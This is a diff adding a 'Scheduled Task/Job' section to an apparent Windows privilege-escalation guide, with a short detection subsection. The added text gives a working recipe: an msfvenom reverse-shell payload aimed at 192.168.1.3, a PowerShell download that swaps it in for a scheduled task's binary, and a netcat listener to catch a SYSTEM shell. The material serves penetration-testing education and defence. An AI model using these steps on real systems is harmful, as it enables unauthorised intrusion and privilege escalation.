@@ -164,6 +164,41 @@ If the unquoted service path is :code:`C:\Program Files\path to\service.exe`, yo
 
 </details>
 <details>
+<summary>Scheduled Task/Job</summary>
+ <br> 
+An attacker can exploit Windows Task Scheduler to schedule malicious programs for initial or recurrent execution. For persistence, the attacker typically uses Windows Task Scheduler to launch applications at system startup or at predefined intervals. Furthermore, the attacker executes remote code under the context of a specified account to achieve Privilege Escalation.
+
+Task Scheduler
+ You can easily schedule an automatic job using the Task Scheduler service. When you utilize this service, you set up any program to run at a specific date and time that suits your needs. Subsequently, Task Scheduler evaluates the defined time or event criteria and runs the task once those conditions are met.
+
+Abusing Schedule Task/Job
+An attacker can escalate privileges by exploiting Schedule Task/Job. Following an initial foothold, we can query to obtain the list for the scheduled task.
+
+    schtasks /query /fo LIST /V
+This helps an attack to understand which application is attached to execute Job at what time.
+ 
+ To obtain a reverse shell as NT Authority SYSTEM, first create a malicious EXE file that a scheduled task can execute. Using Msfvenom, we then generate the EXE file and inject it into the target system accordingly.
+
+    msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f exe > shell.exe
+To abuse the scheduled Task, the attacker will either modify the application by overwriting it or may replace the original file from the duplicate. To insert a duplicate file in the same directory, we rename the original file as a file.bak.
+
+Then downloaded malicious file.exe in the same directory with the help of wget command.
+   
+    powershell wget 192.168.1.3/shell.exe –o file.exe
+Once the duplicate file.exe is injected in the same directory then, the file.exe will be executed automatically through Task Scheduler. As attackers make sure that netcat listener must be at listening mode for obtaining reverse connection for privilege shell.
+
+    nc -lvp 8888
+    whoami /priv
+
+Detection
+Tools such as Sysinternals[https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns] Autoruns can detect system changes like showing presently scheduled jobs.
+Tools like TCPView[https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview] & Process Explore[https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer] may help to identify remote connections for suspicious services or processes.
+View Task Properties and History: To view a task’s properties and history by using a command line
+Schtasks /Query /FO LIST /V
+
+Enable the “Microsoft-Windows-TaskScheduler/Operational” configuration inside the event logging service to report scheduled task creation and updates.
+</details>
+<details>
 <summary>Cleartext Passwords</summary>
  <br> 
 
